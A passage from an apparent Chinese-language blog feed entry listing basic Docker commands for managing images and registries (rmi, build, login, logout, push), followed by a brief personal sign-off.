class="line">$ docker rmi &lt;镜像名称&gt;# 删除本地镜像</span><br><span class="line">$ docker build# 创建新的镜像</span><br></pre></td></tr></table></figure><h2 id="0x02-仓库管理"><a href="#0x02-仓库管理" class="headerlink" title="0x02 仓库管理"></a>0x02 仓库管理</h2><p>我们要拉取镜像到本地，都是到仓库上面找的，仓库是集中存放镜像的地方。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker login# 登录仓库</span><br><span class="line">$ docker logout# 注销仓库</span><br><span class="line">$ docker push &lt;用户名&gt;/&lt;镜像名称&gt;:&lt;版本号&gt;# 推送镜像</span><br></pre></td></tr></table></figure><h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>当然还有制作Dockerfile的内容，但是太多辣，这里先不写着了。等工作用到的时候再记录进来，祝一切顺利吧！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Docker&quot;&gt;&lt;a href=&quot;#Docker&quot; class=&quot;headerlink&quot; title=&quot;Docker&quot;&gt;&lt;/a&gt;Docker&lt;/h1&gt;&lt;p&gt;哎，要上班了。在家呆了这么久，突然得自己一人去工作，很不舍。不过，始终得静下心来，毕竟颓了这么久。所以今天写
      
    
    </summary>
    
    
      <category term="计算机基础" scheme="http://bai-ren-1.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
</feed>
